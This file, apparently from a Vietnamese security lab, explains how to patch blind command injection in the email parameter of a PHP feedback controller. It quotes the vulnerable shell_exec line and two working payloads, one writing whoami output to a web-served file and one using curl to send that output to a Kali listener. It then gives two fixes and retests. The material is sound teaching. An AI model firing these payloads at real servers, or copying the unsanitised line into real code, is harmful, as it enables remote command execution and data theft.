@@ -1,0 +1,117 @@
+╔══════════════════════════════════════════════════════════════════╗
+║   VÁ LỖ HỔNG KỊCH BẢN 2 & 3 - BLIND COMMAND INJECTION          ║
+╚══════════════════════════════════════════════════════════════════╝
+
+📍 FILE: /var/www/html/app/controllers/FeedbackController.php
+🎯 LỖ HỔNG: Command Injection qua parameter email (BLIND)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔴 HIỆN TẠI: LỖ HỔNG ĐANG BẬT
+
+KỊCH BẢN 2 - Output Redirection:
+POST /feedback/send
+email=a||whoami>/var/www/images/out.txt||b
+
+→ File out.txt được tạo ✅
+→ GET /image?filename=out.txt → Response: www-data
+
+KỊCH BẢN 3 - OOB Exfiltration:
+POST /feedback/send
+email=x;curl http://192.168.11.21:8000/?d=`whoami`;
+
+→ Kali nhận: GET /?d=www-data ✅
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🛠️  CÁCH VÁ:
+
+Mở file:
+nano /var/www/html/app/controllers/FeedbackController.php
+
+Tìm dòng 30-31 (ĐANG BẬT):
+────────────────────────────
+$command = "mail -s Feedback -r " . $email . " admin@cybershop.com";
+$output = shell_exec($command);
+
+→ Comment lại (thêm //):
+────────────────────────────
+//$command = "mail -s Feedback -r " . $email . " admin@cybershop.com";
+//$output = shell_exec($command);
+
+
+Chọn 1 trong 2 cách dưới và uncomment (bỏ //):
+
+┌──────────────────────────────────────────────────────────────────┐
+│ CÁCH 1: filter_var() + escapeshellarg() - NHANH                 │
+└──────────────────────────────────────────────────────────────────┘
+
+Uncomment dòng 40-45:
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    header("Location: /result?msg=invalid_email");
+    exit;
+}
+$command = "mail -s Feedback -r " . escapeshellarg($email) . " admin@cybershop.com";
+$output = shell_exec($command);
+
+✅ Validate email format
+✅ Escape special chars
+✅ Fix trong 30 giây
+
+
+┌──────────────────────────────────────────────────────────────────┐
+│ CÁCH 2: Whitelist domains - AN TOÀN HƠN                         │
+└──────────────────────────────────────────────────────────────────┘
+
+Uncomment dòng 48-54:
+$allowedDomains = ['gmail.com', 'yahoo.com', 'outlook.com'];
+$emailDomain = substr(strrchr($email, "@"), 1);
+if (!in_array($emailDomain, $allowedDomains)) {
+    header("Location: /result?msg=invalid_domain");
+    exit;
+}
+$command = "mail -s Feedback -r " . escapeshellarg($email) . " admin@cybershop.com";
+$output = shell_exec($command);
+
+✅ Chỉ cho phép email từ domain trong whitelist
+✅ Chặn domain lạ
+✅ An toàn hơn
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🧪 TEST SAU KHI VÁ:
+
+KB2 Payload:
+POST /feedback/send
+email=a||whoami>/var/www/images/out.txt||b
+
+CÁCH 1:
+→ Response: Location: /result?msg=invalid_email ✅
+→ File out.txt KHÔNG tạo ra ✅
+
+CÁCH 2:
+→ Response: Location: /result?msg=invalid_domain ✅
+→ File out.txt KHÔNG tạo ra ✅
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+KB3 Payload:
+POST /feedback/send
+email=x;curl http://192.168.11.21:8000/?d=`whoami`;
+
+CÁCH 1:
+→ Response: Location: /result?msg=invalid_email ✅
+→ Kali KHÔNG nhận request ✅
+
+CÁCH 2:
+→ Response: Location: /result?msg=invalid_domain ✅
+→ Kali KHÔNG nhận request ✅
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎯 KHUYẾN NGHỊ:
+
+Development/Testing: Dùng CÁCH 1 (nhanh)
+Production: Dùng CÁCH 2 (an toàn hơn, whitelist domains)
+
+╚══════════════════════════════════════════════════════════════════╝
